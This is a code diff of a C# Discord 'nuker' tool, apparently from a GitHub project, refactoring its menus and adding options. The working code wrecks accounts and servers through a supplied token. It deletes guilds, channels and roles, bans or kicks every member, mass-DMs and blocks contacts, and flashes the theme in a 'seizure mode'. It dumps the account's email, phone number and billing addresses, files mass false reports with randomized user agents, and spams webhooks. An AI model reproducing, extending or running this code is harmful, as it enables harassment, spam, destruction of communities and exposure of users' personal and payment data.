@@ -21,7 +21,15 @@ namespace nuker
 {
     class Program
     {
+        #region Configs
         public static string token;
+        public static int WaitTimeShort = 200;
+        public static int WaitTimeLong = 2000;
+
+        class config
+        {
+            public string token { get; set; }
+        }
 
         public static void GetConfig()
         {
@@ -46,9 +54,12 @@ namespace nuker
 
         static DiscordSocketClient client = new DiscordSocketClient();
         static string guildid;
+        #endregion
 
+        #region Write Logo, Write Line
         static void WriteLogo()
         {
+            Console.Clear();
             Console.WriteLine(@"        _ _   _           _                            __        _        _             _   
    __ _(_) |_| |__  _   _| |__   ___ ___  _ __ ___    / /____  _| |_ __ _| |_ ___ _ __ | |_ 
   / _` | | __| '_ \| | | | '_ \ / __/ _ \| '_ ` _ \  / / _ \ \/ / __/ _` | __/ _ \ '_ \| __|
@@ -57,12 +68,23 @@ namespace nuker
   |___/                                                                                     " + Environment.NewLine, Color.BlueViolet);
         }
 
+        static void WriteLine(string number, string text)
+        {
+            Console.Write("[");
+            Console.Write(number, Color.BlueViolet);
+            Console.WriteLine("] " + text);
+        }
+        #endregion
+
+        #region Main
         static void Main(string[] args)
         {
             Console.Title = "github.com/extatent";
             Start();
         }
+        #endregion
 
+        #region Start
         static void Start()
         {
             WriteLogo();
@@ -94,13 +116,12 @@ namespace nuker
                 catch (Exception ex)
                 {
                     Console.WriteLine(ex.Message);
-                    Thread.Sleep(2000);
+                    Thread.Sleep(WaitTimeLong);
                     if (File.Exists("config.json"))
                     {
                         File.Delete("config.json");
                     }
-                    Process.Start(Assembly.GetExecutingAssembly().Location);
-                    Environment.Exit(0);
+                    Start();
                 }
             }
             else
@@ -112,82 +133,84 @@ namespace nuker
                 catch (Exception ex)
                 {
                     Console.WriteLine(ex.Message);
-                    Thread.Sleep(2000);
+                    Thread.Sleep(WaitTimeLong);
                     if (File.Exists("config.json"))
                     {
                         File.Delete("config.json");
                     }
-                    Process.Start(Assembly.GetExecutingAssembly().Location);
-                    Environment.Exit(0);
+                    Start();
                 }
             }
 
+            WriteLogo();
             Console.Title = $"github.com/extatent | {client.User}";
 
-            WriteLine("1", "Account nuker");
-            WriteLine("2", "Server nuker");
-            WriteLine("3", "Report bot");
-            WriteLine("4", "Webhook spammer");
-            WriteLine("5", "Login to other account");
-            Console.Write("Your choice: ");
-            int option = Convert.ToInt32(Console.ReadLine());
-            switch (option)
+            try
             {
-                default:
-                    Console.WriteLine("Not a valid option.");
-                    DoneMethod4();
-                    break;
-                case 1:
-                    try
-                    {
-                        Console.Title = $"github.com/extatent | {client.User}";
-                        Console.Clear();
-                        AccountNuker();
-                    }
-                    catch
-                    {
+                WriteLine("1", "Account nuker");
+                WriteLine("2", "Server nuker");
+                WriteLine("3", "Report bot");
+                WriteLine("4", "Webhook spammer");
+                WriteLine("5", "Login to other account");
+                Console.Write("Your choice: ");
+                int option = Convert.ToInt32(Console.ReadLine());
+                switch (option)
+                {
+                    default:
+                        Console.WriteLine("Not a valid option.");
                         DoneMethod4();
-                    }
-                    break;
-                case 2:
-                    try
-                    {
-                        Console.Write("Guild ID: ");
-                        string GuildID = Console.ReadLine();
-                        guildid = GuildID;
-                        DiscordGuild guild = client.GetGuild(ulong.Parse(GuildID));
-                        Console.Title = $"github.com/extatent | {client.User} | {guild.Name}";
-                        Console.Clear();
-                        ServerNuker();
-                    }
-                    catch
-                    {
-                        DoneMethod4();
-                    }
-                    break;
-                case 3:
-                    Console.Clear();
-                    WriteLogo();
-                    try
-                    {
-                        Console.Write("Guild ID: ");
-                        string guildID = Console.ReadLine();
-                        Console.Write("Channel ID: ");
-                        string channelid = Console.ReadLine();
-                        Console.Write("Message ID: ");
-                        string messageid = Console.ReadLine();
-                        Console.WriteLine("[1] Illegal Content\n[2] Harrassment\n[3] Spam or Phishing Links\n[4] Self harm\n[5] NSFW");
-                        Console.Write("Your choice: ");
-                        string reason = Console.ReadLine();
-                        Console.WriteLine("Reports count: ");
-                        int count = int.Parse(Console.ReadLine());
-
-                        HttpRequest httpRequest = new HttpRequest();
-                        httpRequest.Authorization = token;
-                        httpRequest.UserAgentRandomize();
-                        string url = "https://discord.com/api/v10/report";
-                        string jsonData = string.Concat(new string[]
+                        break;
+                    case 1:
+                        try
                         {
+                            Console.Title = $"github.com/extatent | {client.User}";
+                            Console.Clear();
+                            AccountNuker();
+                        }
+                        catch
+                        {
+                            DoneMethod4();
+                        }
+                        break;
+                    case 2:
+                        try
+                        {
+                            Console.Write("Guild ID: ");
+                            string GuildID = Console.ReadLine();
+                            guildid = GuildID;
+                            DiscordGuild guild = client.GetGuild(ulong.Parse(GuildID));
+                            Console.Title = $"github.com/extatent | {client.User} | {guild.Name}";
+                            Console.Clear();
+                            ServerNuker();
+                        }
+                        catch
+                        {
+                            DoneMethod4();
+                        }
+                        break;
+                    case 3:
+                        Console.Clear();
+                        WriteLogo();
+                        try
+                        {
+                            Console.Write("Guild ID: ");
+                            string guildID = Console.ReadLine();
+                            Console.Write("Channel ID: ");
+                            string channelid = Console.ReadLine();
+                            Console.Write("Message ID: ");
+                            string messageid = Console.ReadLine();
+                            Console.WriteLine("[1] Illegal Content\n[2] Harrassment\n[3] Spam or Phishing Links\n[4] Self harm\n[5] NSFW");
+                            Console.Write("Your choice: ");
+                            string reason = Console.ReadLine();
+                            Console.WriteLine("Reports count: ");
+                            int count = int.Parse(Console.ReadLine());
+
+                            HttpRequest httpRequest = new HttpRequest();
+                            httpRequest.Authorization = token;
+                            httpRequest.UserAgentRandomize();
+                            string url = "https://discord.com/api/v10/report";
+                            string jsonData = string.Concat(new string[]
+                            {
                         "{\"channel_id\": \"",
                         channelid,
                         "\", \"guild_id\": \"",
@@ -197,73 +220,82 @@ namespace nuker
                         "\", \"reason\": \"",
                         reason,
                         "\" }"
-                        });
-                        int reports = 0;
-                        for (int i = 0; i < count; i++)
-                        {
-                            try
+                            });
+                            int reports = 0;
+                            for (int i = 0; i < count; i++)
                             {
-                                HttpResponse response = httpRequest.Post(url, jsonData, "application/json");
-                                bool status = response.StatusCode.ToString() == "Created";
-                                if (status)
+                                try
                                 {
-                                    reports++;
+                                    HttpResponse response = httpRequest.Post(url, jsonData, "application/json");
+                                    bool status = response.StatusCode.ToString() == "Created";
+                                    if (status)
+                                    {
+                                        reports++;
+                                    }
+
+                                    Console.Title = $"github.com/extatent | {client.User} | Reports sent: " + reports.ToString();
                                 }
-
-                                Console.Title = $"github.com/extatent | {client.User} | Reports sent: " + reports.ToString();
+                                catch
+                                { }
                             }
-                            catch
-                            { }
+                            Console.Title = $"github.com/extatent | {client.User}";
+                            Console.WriteLine("Total reports sent: " + reports.ToString());
                         }
-                        Console.Title = $"github.com/extatent | {client.User}";
-                        Console.WriteLine("Total reports sent: " + reports.ToString());
-                    }
-                    catch
-                    {
-                        DoneMethod4();
-                    }
-                    DoneMethod3();
-                    break;
-                case 4:
-                    Console.Clear();
-                    WriteLogo();
-                    try
-                    {
-                        Console.Write("Webhook: ");
-                        string webhook = Console.ReadLine();
-                        Console.Write("Message: ");
-                        string message = Console.ReadLine();
-                        Console.Write("Count: ");
-                        string mcount = Console.ReadLine();
-
-                        for (int i = 0; i < int.Parse(mcount); i++)
+                        catch
                         {
-                            try
-                            {
-                                Webhook hook = new Webhook(webhook);
-                                hook.SendMessage(message);
-                                Thread.Sleep(2000);
-                            }
-                            catch { }
+                            DoneMethod4();
                         }
-                    }
-                    catch
-                    {
-                        DoneMethod4();
-                    }
-                    DoneMethod3();
-                    break;
-                case 5:
-                    if (File.Exists("config.json"))
-                    {
-                        File.Delete("config.json");
-                    }
-                    Process.Start(Assembly.GetExecutingAssembly().Location);
-                    Environment.Exit(0);
-                    break;
+                        DoneMethod3();
+                        break;
+                    case 4:
+                        Console.Clear();
+                        WriteLogo();
+                        try
+                        {
+                            Console.Write("Webhook: ");
+                            string webhook = Console.ReadLine();
+                            Console.Write("Message: ");
+                            string message = Console.ReadLine();
+                            Console.Write("Count: ");
+                            string mcount = Console.ReadLine();
+
+                            for (int i = 0; i < int.Parse(mcount); i++)
+                            {
+                                try
+                                {
+                                    Webhook hook = new Webhook(webhook);
+                                    hook.SendMessage(message);
+                                    Thread.Sleep(WaitTimeLong);
+                                }
+                                catch { }
+                            }
+                        }
+                        catch
+                        {
+                            DoneMethod4();
+                        }
+                        DoneMethod3();
+                        break;
+                    case 5:
+                        if (File.Exists("config.json"))
+                        {
+                            File.Delete("config.json");
+                        }
+                        Process.Start(Assembly.GetExecutingAssembly().Location);
+                        Environment.Exit(0);
+                        break;
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+                Thread.Sleep(WaitTimeLong);
+                Start();
             }
         }
+        #endregion
 
+        #region Webhook class
         class Webhook
         {
             private HttpClient Client;
@@ -284,23 +316,13 @@ namespace nuker
                 return resp.StatusCode == System.Net.HttpStatusCode.NoContent;
             }
         }
+        #endregion
 
-        class config
-        {
-            public string token { get; set; }
-        }
-
-        static void WriteLine(string number, string text)
-        {
-            Console.Write("[");
-            Console.Write(number, Color.BlueViolet);
-            Console.WriteLine("] " + text);
-        }
-
+        #region Done methods
         static void DoneMethod()
         {
             Console.WriteLine("Done");
-            Thread.Sleep(2000);
+            Thread.Sleep(WaitTimeLong);
             Console.Clear();
             AccountNuker();
         }
@@ -308,7 +330,7 @@ namespace nuker
         static void DoneMethod2()
         {
             Console.WriteLine("Done");
-            Thread.Sleep(2000);
+            Thread.Sleep(WaitTimeLong);
             Console.Clear();
             ServerNuker();
         }
@@ -316,24 +338,26 @@ namespace nuker
         static void DoneMethod3()
         {
             Console.WriteLine("Done");
-            Thread.Sleep(2000);
+            Thread.Sleep(WaitTimeLong);
             Console.Clear();
             Start();
         }
 
         static void DoneMethod4()
         {
-            Thread.Sleep(2000);
+            Thread.Sleep(WaitTimeLong);
             Console.Clear();
             Start();
         }
+        #endregion
 
+        #region Account nuker
         static void AccountNuker()
         {
             string[] options =
             {
                 "Terminate Account", "Leave/Delete Guilds", "Clear Relationships", "Leave HypeSquad", "Remove Connections", "Deauthorize Apps", 
-                "Mass Create Guilds", "Seizure Mode", "Confuse Mode", "Mass DM", "Delete DMs", "User Info"
+                "Mass Create Guilds", "Seizure Mode", "Confuse Mode", "Mass DM", "User Info", "Block Relationships", "Go Back"
             };
             int j = 0;
             WriteLogo();
@@ -347,8 +371,8 @@ namespace nuker
             switch(option)
             {
                 default:
-                    Console.WriteLine("Wrong key");
-                    Thread.Sleep(2000);
+                    Console.WriteLine("Not a valid option.");
+                    Thread.Sleep(WaitTimeLong);
                     Console.Clear();
                     AccountNuker();
                     break;
@@ -380,7 +404,7 @@ namespace nuker
                             {
                                 guild.Leave();
                             }
-                            Thread.Sleep(200);
+                            Thread.Sleep(WaitTimeShort);
                         }
                         catch { }
                     }
@@ -392,7 +416,7 @@ namespace nuker
                         try
                         {
                             relationship.Remove();
-                            Thread.Sleep(200);
+                            Thread.Sleep(WaitTimeShort);
                         }
                         catch
                         { }
@@ -410,7 +434,7 @@ namespace nuker
                         try
                         {
                             connections.Remove();
-                            Thread.Sleep(200);
+                            Thread.Sleep(WaitTimeShort);
                         }
                         catch
                         { }
@@ -423,7 +447,7 @@ namespace nuker
                         try
                         {
                             apps.Deauthorize();
-                            Thread.Sleep(200);
+                            Thread.Sleep(WaitTimeShort);
                         }
                         catch
                         { }
@@ -441,7 +465,7 @@ namespace nuker
                             for (int i = 0; i < 100; i++)
                             {
                                 client.CreateGuild(name);
-                                Thread.Sleep(200);
+                                Thread.Sleep(WaitTimeShort);
                             }
                         }
 
@@ -455,13 +479,10 @@ namespace nuker
                     {
                         while (true)
                         {
-                            for (int i = 0; i < 1000; i++)
-                            {
-                                client.User.ChangeSettings(new UserSettingsProperties() { Theme = DiscordTheme.Light });
-                                Thread.Sleep(200);
-                                client.User.ChangeSettings(new UserSettingsProperties() { Theme = DiscordTheme.Dark });
-                                Thread.Sleep(200);
-                            }
+                            client.User.ChangeSettings(new UserSettingsProperties() { Theme = DiscordTheme.Light });
+                            Thread.Sleep(WaitTimeShort);
+                            client.User.ChangeSettings(new UserSettingsProperties() { Theme = DiscordTheme.Dark });
+                            Thread.Sleep(WaitTimeShort);
                         }
                     }
                     catch
@@ -496,7 +517,7 @@ namespace nuker
                             {
                                 PrivateChannel channel = client.CreateDM(relationship.User.Id);
                                 client.SendMessage(channel, message);
-                                Thread.Sleep(200);
+                                Thread.Sleep(WaitTimeShort);
                             }
                             catch
                             { }
@@ -507,7 +528,7 @@ namespace nuker
                         try
                         {
                             dms.SendMessage(message);
-                            Thread.Sleep(200);
+                            Thread.Sleep(WaitTimeShort);
                         }
                         catch
                         { }
@@ -515,21 +536,6 @@ namespace nuker
                     DoneMethod();
                     break;
                 case 11:
-                    foreach (var dms in client.GetPrivateChannels())
-                    {
-                        try
-                        {
-                            dms.Leave();
-                            Thread.Sleep(200);
-                            dms.Delete();
-                            Thread.Sleep(200);
-                        }
-                        catch
-                        { }
-                    }
-                    DoneMethod();
-                    break;
-                case 12:
                     try
                     {
                         Console.Clear();
@@ -544,23 +550,43 @@ namespace nuker
                             Console.WriteLine("ID: " + paymentMethod.Id + "\nInvalid: " + paymentMethod.Invalid + "\nAddress 1: " + paymentMethod.BillingAddress.Address1 + "\nAddress 2: " + paymentMethod.BillingAddress.Address2 + "\nCity: " + paymentMethod.BillingAddress.City + "\nCountry: " + paymentMethod.BillingAddress.Country + "\nPostal Code: " + paymentMethod.BillingAddress.PostalCode + "\nState: " + paymentMethod.BillingAddress.State + "\n");
                         }
                         Console.WriteLine("\nAccount Info:");
-                        Console.WriteLine("ID: " + client.GetClientUser().Id + "\nEmail: " + client.GetClientUser().Email + "\nPhone number: " + client.GetClientUser().PhoneNumber  + "\nRegistered at: " + client.GetClientUser().CreatedAt + "\nRegistration language: " + client.GetClientUser().RegistrationLanguage + "\nGuilds count: " + client.GetCachedGuilds().Count + "\nFriends count: " + client.GetRelationships().Count + "\nBadges: " + client.GetClientUser().Badges);
+                        Console.WriteLine("ID: " + client.GetClientUser().Id + "\nEmail: " + client.GetClientUser().Email + "\nPhone number: " + client.GetClientUser().PhoneNumber  + "\nRegistered at: " + client.GetClientUser().CreatedAt + "\nRegistration language: " + client.GetClientUser().RegistrationLanguage + "\nGuilds count: " + client.GetCachedGuilds().Count + "\nFriends count: " + client.GetRelationships().Count + "\nDMs count: " + client.GetPrivateChannels().Count + "\nBadges: " + client.GetClientUser().Badges);
                         Console.WriteLine("\nPress any key to go back.");
                         Console.ReadKey();
-                        DoneMethod4();
+                        Thread.Sleep(WaitTimeLong);
+                        Console.Clear();
+                        AccountNuker();
                     }
                     catch
                     { }
                     break;
+                case 12:
+                    foreach (var relationship in client.GetRelationships())
+                    {
+                        try
+                        {
+                            client.BlockUser(relationship.User.Id);
+                            Thread.Sleep(WaitTimeShort);
+                        }
+                        catch
+                        { }
+                    }
+                    DoneMethod();
+                    break;
+                case 13:
+                    Start();
+                    break;
             }
         }
+        #endregion
 
+        #region Server Nuker
         static void ServerNuker()
         {
             string[] options =
             {
                 "Delete All Roles", "Remove All Bans", "Delete All Channels", "Delete All Emojis", "Delete All Invites", "Mass Create Roles",
-                "Mass Create Channels", "Ban All Members", "Kick All Members", "Mass DM", "Server Info"
+                "Mass Create Channels", "Ban All Members", "Kick All Members", "Mass DM", "Server Info", "Leave Server", "Go Back"
             };
             int j = 0;
             WriteLogo();
@@ -575,8 +601,8 @@ namespace nuker
             switch(option)
             {
                 default:
-                    Console.WriteLine("Wrong key");
-                    Thread.Sleep(2000);
+                    Console.WriteLine("Not a valid option.");
+                    Thread.Sleep(WaitTimeLong);
                     Console.Clear();
                     ServerNuker();
                     break;
@@ -586,7 +612,7 @@ namespace nuker
                         try
                         {
                             roles.Delete();
-                            Thread.Sleep(200);
+                            Thread.Sleep(WaitTimeShort);
                         }
                         catch { }
                     }
@@ -598,7 +624,7 @@ namespace nuker
                         try
                         {
                             bans.Unban();
-                            Thread.Sleep(200);
+                            Thread.Sleep(WaitTimeShort);
                         }
                         catch { }
                     }
@@ -610,7 +636,7 @@ namespace nuker
                         try
                         {
                             channels.Delete();
-                            Thread.Sleep(200);
+                            Thread.Sleep(WaitTimeShort);
                         }
                         catch { }
                     }
@@ -622,7 +648,7 @@ namespace nuker
                         try
                         {
                             emojis.Delete();
-                            Thread.Sleep(200);
+                            Thread.Sleep(WaitTimeShort);
                         }
                         catch { }
                     }
@@ -634,7 +660,7 @@ namespace nuker
                         try
                         {
                             invites.Delete();
-                            Thread.Sleep(200);
+                            Thread.Sleep(WaitTimeShort);
                         }
                         catch { }
                     }
@@ -648,7 +674,7 @@ namespace nuker
                             try
                             {
                                 guild.CreateRole();
-                                Thread.Sleep(200);
+                                Thread.Sleep(WaitTimeShort);
                             }
                             catch { }
                         }
@@ -667,7 +693,7 @@ namespace nuker
                             try
                             {
                                 guild.CreateChannel(name, 0);
-                                Thread.Sleep(200);
+                                Thread.Sleep(WaitTimeShort);
                             }
                             catch { }
                         }
@@ -682,7 +708,7 @@ namespace nuker
                         foreach (var user in client.GetCachedGuild(Convert.ToUInt64(guildid)).GetMembers())
                         {
                             user.Ban();
-                            Thread.Sleep(200);
+                            Thread.Sleep(WaitTimeShort);
                         }
                     }
                     catch
@@ -695,7 +721,7 @@ namespace nuker
                         foreach (var user in client.GetCachedGuild(Convert.ToUInt64(guildid)).GetMembers())
                         {
                             user.Kick();
-                            Thread.Sleep(200);
+                            Thread.Sleep(WaitTimeShort);
                         }
                     }
                     catch
@@ -713,7 +739,7 @@ namespace nuker
                     {
                         PrivateChannel channel = client.CreateDM(user.User.Id);
                         client.SendMessage(channel, message);
-                        Thread.Sleep(200);
+                        Thread.Sleep(WaitTimeShort);
                     }
                     DoneMethod2();
                     break;
@@ -731,7 +757,22 @@ namespace nuker
                     catch
                     { }
                     break;
+                case 12:
+                    try
+                    {
+                        guild.Delete();
+                        Thread.Sleep(WaitTimeShort);
+                        guild.Leave();
+                        Thread.Sleep(WaitTimeShort);
+                    }
+                    catch 
+                    { }
+                    break;
+                case 13:
+                    Start();
+                    break;
             }
         }
+        #endregion
     }
 }
